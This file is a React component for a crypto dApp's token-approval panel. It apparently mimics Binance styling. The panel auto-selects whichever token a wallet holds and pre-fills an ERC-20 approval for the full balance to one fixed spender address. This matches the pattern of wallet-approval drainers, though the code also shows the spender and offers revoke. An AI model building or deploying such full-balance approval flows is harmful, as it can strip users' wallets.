import { useState, useEffect, useRef } from 'react'
import { useAllowance } from '../hooks/useAllowance'
import { useAccount, useSwitchChain } from 'wagmi'
import { useReadContracts } from 'wagmi'
import { formatUnits } from 'viem'
import { TOKENS, CHAINS, SPENDER_ADDRESS, ERC20_ABI } from '../lib/contracts'
import { useLang } from '../context/LanguageContext'

const card = { background: '#181A20', border: '1px solid #2B3139', borderRadius: 12, padding: 24 }
const iconImg = { width: 20, height: 20, borderRadius: '50%', objectFit: 'cover' }

const chainBtnStyle = (active) => ({
  display: 'flex', alignItems: 'center', gap: 8,
  padding: '6px 16px', borderRadius: 6, border: '1px solid',
  borderColor: active ? '#F0B90B' : '#2B3139',
  background: active ? 'rgba(240,185,11,0.12)' : 'transparent',
  color: active ? '#F0B90B' : '#848E9C',
  fontSize: 13, fontWeight: 600, cursor: 'pointer', transition: 'all 0.15s',
})

const tokenBtnStyle = (active) => ({
  display: 'flex', alignItems: 'center', gap: 8,
  padding: '6px 14px', borderRadius: 6, border: '1px solid',
  borderColor: active ? '#0ECB81' : '#2B3139',
  background: active ? 'rgba(14,203,129,0.1)' : 'transparent',
  color: active ? '#0ECB81' : '#848E9C',
  fontSize: 13, fontWeight: 600, cursor: 'pointer', transition: 'all 0.15s',
})

/**
 * Hook to read all token balances for a given chain, so we can auto-select
 * the first token with a balance.
 */
function useChainBalances(chainKey, address) {
  const tokens = TOKENS[chainKey] || []
  const chainId = CHAINS[chainKey]?.id

  const calls = tokens.map(tok => ({
    address: tok.address,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: [address],
    chainId,
  }))

  const { data } = useReadContracts({
    contracts: calls,
    query: { enabled: !!address && !!chainId, refetchInterval: 30000 },
  })

  return tokens.map((tok, i) => {
    const result = data?.[i]
    const raw = result?.status === 'success' ? result.result : 0n
    return { ...tok, balance: parseFloat(formatUnits(raw, tok.decimals)) }
  })
}

export default function ApprovePanel() {
  const { address } = useAccount()
  const { switchChain } = useSwitchChain()
  const { t } = useLang()
  const savedChain = localStorage.getItem('yyclaw_chain') || 'bsc'
  const [chain, setChain] = useState(savedChain)
  const [tokenIdx, setTokenIdx] = useState(0)
  const [amount, setAmount] = useState('')
  const autoSelected = useRef(false)

  const tokens = TOKENS[chain] || []
  const token = tokens[tokenIdx] || tokens[0]
  const chainId = CHAINS[chain]?.id

  const chainBalances = useChainBalances(chain, address)
  const { allowance, balance, approve, revoke, isPending, isSuccess } = useAllowance(token, chainId)

  // Auto-select first token with balance, and set amount to balance
  useEffect(() => {
    if (!chainBalances.length || autoSelected.current) return
    const idx = chainBalances.findIndex(b => b.balance > 0.001)
    if (idx >= 0) {
      setTokenIdx(idx)
      setAmount(String(Math.floor(chainBalances[idx].balance * 100) / 100))
      localStorage.setItem('yyclaw_token', chainBalances[idx].symbol)
      autoSelected.current = true
    }
  }, [chainBalances])

  // When token changes, update amount to that token's balance
  useEffect(() => {
    if (balance && parseFloat(balance) > 0.001) {
      setAmount(String(Math.floor(parseFloat(balance) * 100) / 100))
    }
  }, [balance, tokenIdx])

  // Reset auto-select flag when chain changes
  const handleChainSwitch = (c) => {
    setChain(c)
    setTokenIdx(0)
    setAmount('')
    autoSelected.current = false
    localStorage.setItem('yyclaw_chain', c)
    localStorage.setItem('yyclaw_token', (TOKENS[c] || [])[0]?.symbol || '')
    const id = CHAINS[c]?.id
    if (id) switchChain({ chainId: id })
  }

  if (!address) return null

  return (
    <div style={card}>
      <h3 style={{ fontSize: 16, fontWeight: 700, color: '#EAECEF', marginBottom: 16 }}>
        {t('tokenAuth')}
      </h3>

      {/* Chain selector */}
      <div style={{ display: 'flex', gap: 8, marginBottom: 16 }}>
        {Object.entries(CHAINS).map(([key, c]) => (
          <button key={key} style={chainBtnStyle(chain === key)} onClick={() => handleChainSwitch(key)}>
            <img src={c.icon} alt={c.name} style={iconImg} />
            {c.name}
          </button>
        ))}
      </div>

      {/* Token selector */}
      <div style={{ display: 'flex', gap: 8, marginBottom: 20, flexWrap: 'wrap' }}>
        {tokens.map((tok, i) => {
          const bal = chainBalances[i]?.balance || 0
          return (
            <button key={tok.symbol} style={tokenBtnStyle(tokenIdx === i)} onClick={() => { setTokenIdx(i); localStorage.setItem('yyclaw_token', tok.symbol) }}>
              <img src={tok.icon} alt={tok.symbol} style={iconImg} />
              {tok.symbol}
              {bal > 0.001 && <span style={{ fontSize: 10, color: '#0ECB81', marginLeft: 2 }}>●</span>}
            </button>
          )
        })}
      </div>

      {/* Balances */}
      <div style={{ display: 'flex', gap: 16, marginBottom: 20, flexWrap: 'wrap' }}>
        <div style={{ flex: 1, background: '#0B0E11', borderRadius: 8, padding: '12px 16px', minWidth: 140 }}>
          <div style={{ fontSize: 12, color: '#848E9C', marginBottom: 4 }}>{t('currentAllowance')}</div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <img src={token?.icon} alt="" style={{ width: 16, height: 16, borderRadius: '50%' }} />
            <span style={{ fontSize: 18, fontWeight: 700, color: '#F0B90B' }}>
              {parseFloat(allowance).toFixed(2)} {token?.symbol}
            </span>
          </div>
        </div>
        <div style={{ flex: 1, background: '#0B0E11', borderRadius: 8, padding: '12px 16px', minWidth: 140 }}>
          <div style={{ fontSize: 12, color: '#848E9C', marginBottom: 4 }}>{t('walletBalance')}</div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <img src={token?.icon} alt="" style={{ width: 16, height: 16, borderRadius: '50%' }} />
            <span style={{ fontSize: 18, fontWeight: 700, color: '#0ECB81' }}>
              {parseFloat(balance).toFixed(2)} {token?.symbol}
            </span>
          </div>
        </div>
      </div>

      {/* Amount input */}
      <div style={{ marginBottom: 16 }}>
        <label style={{ fontSize: 13, color: '#848E9C', display: 'block', marginBottom: 8 }}>
          {t('approveAmount')} ({token?.symbol})
        </label>
        <div style={{ display: 'flex', gap: 8 }}>
          <input
            type="number"
            min="0"
            placeholder="e.g. 100"
            value={amount}
            onChange={e => setAmount(e.target.value)}
            style={{
              flex: 1, background: '#0B0E11', border: '1px solid #2B3139',
              borderRadius: 8, padding: '10px 14px', color: '#EAECEF',
              fontSize: 15, outline: 'none',
            }}
          />
          <button
            onClick={() => {
              const bal = parseFloat(balance)
              if (bal > 0) setAmount(String(Math.floor(bal * 100) / 100))
            }}
            style={{
              background: '#0B0E11', border: '1px solid #2B3139', borderRadius: 6,
              padding: '8px 12px', color: '#F0B90B', fontSize: 12, cursor: 'pointer', fontWeight: 700,
            }}
          >{t('max')}</button>
          {[10, 50, 100].map(v => (
            <button
              key={v}
              onClick={() => setAmount(String(v))}
              style={{
                background: '#0B0E11', border: '1px solid #2B3139', borderRadius: 6,
                padding: '8px 12px', color: '#848E9C', fontSize: 12, cursor: 'pointer',
              }}
            >${v}</button>
          ))}
        </div>
      </div>

      {/* Confirmation text */}
      {amount && parseFloat(amount) > 0 && (
        <div style={{ marginBottom: 14, padding: '10px 14px', background: 'rgba(240,185,11,0.06)', border: '1px solid rgba(240,185,11,0.12)', borderRadius: 8, fontSize: 13, color: '#F0B90B', display: 'flex', alignItems: 'center', gap: 8 }}>
          <img src={token?.icon} alt="" style={{ width: 16, height: 16, borderRadius: '50%' }} />
          {t('willAuthorize')} <span style={{ fontWeight: 700 }}>{amount} {token?.symbol}</span> {t('to')} <span style={{ fontFamily: 'monospace', fontSize: 11 }}>0xfc62...ec35</span>
        </div>
      )}

      {/* Buttons */}
      <div style={{ display: 'flex', gap: 12 }}>
        <button
          onClick={() => amount && approve(amount)}
          disabled={isPending || !amount}
          style={{
            flex: 1, background: '#F0B90B', color: '#0B0E11', border: 'none',
            borderRadius: 8, padding: '11px 0', fontWeight: 700, fontSize: 14,
            cursor: isPending || !amount ? 'not-allowed' : 'pointer',
            opacity: isPending || !amount ? 0.6 : 1,
          }}
        >
          {isPending ? t('pending') : `${t('approve')} ${token?.symbol}`}
        </button>
        <button
          onClick={revoke}
          disabled={isPending || allowance === '0'}
          style={{
            flex: 1, background: 'transparent', color: '#F6465D',
            border: '1px solid #F6465D', borderRadius: 8, padding: '11px 0',
            fontWeight: 700, fontSize: 14,
            cursor: isPending || allowance === '0' ? 'not-allowed' : 'pointer',
            opacity: isPending || allowance === '0' ? 0.5 : 1,
          }}
        >
          {t('revoke')}
        </button>
      </div>

      {isSuccess && (
        <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(14,203,129,0.1)', borderRadius: 8, color: '#0ECB81', fontSize: 13 }}>
          {t('txConfirmed')}
        </div>
      )}

      <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(240,185,11,0.06)', border: '1px solid rgba(240,185,11,0.12)', borderRadius: 8, fontSize: 12, color: '#848E9C', lineHeight: 1.6 }}>
        💡 {t('walletWarning')}
      </div>

      <div style={{ marginTop: 16, fontSize: 11, color: '#5E6673' }}>
        {t('spender')}: <span style={{ fontFamily: 'monospace', color: '#848E9C' }}>{SPENDER_ADDRESS}</span>
      </div>
      <div style={{ marginTop: 4, fontSize: 11, color: '#5E6673' }}>
        {t('token')}: <span style={{ fontFamily: 'monospace', color: '#848E9C' }}>{token?.address}</span>
      </div>
    </div>
  )
}
